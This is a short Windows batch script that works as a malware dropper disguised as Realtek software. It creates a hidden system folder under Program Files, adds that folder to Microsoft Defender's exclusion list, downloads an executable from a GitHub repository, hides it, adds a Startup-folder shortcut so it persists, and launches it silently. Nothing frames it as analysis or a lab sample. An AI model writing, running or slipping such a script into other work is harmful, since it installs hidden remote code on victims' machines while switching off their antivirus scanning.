@echo off
REM Create the Realtek folder in Program Files (x86)
mkdir "C:\Program Files (x86)\Realtek"
attrib +s +h +o "C:\Program Files (x86)\Realtek"

REM Add the folder to Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Realtek'"

REM Download the executable
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/faisalalsharif1/asdasdasd/raw/refs/heads/main/Realtek.exe' -OutFile 'C:\Program Files (x86)\Realtek\Realtek.exe'"

REM Hide the executable and the folder
attrib +s +h +o "C:\Program Files (x86)\Realtek\Realtek.exe"
attrib +s +h +o "C:\Program Files (x86)\Realtek"

REM Create a shortcut to startup folder
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Realtek.lnk'); $Shortcut.TargetPath = 'C:\Program Files (x86)\Realtek\Realtek.exe'; $Shortcut.Save()"

REM Run the executable silently
start "" "C:\Program Files (x86)\Realtek\Realtek.exe"

REM Exit the batch script
exit
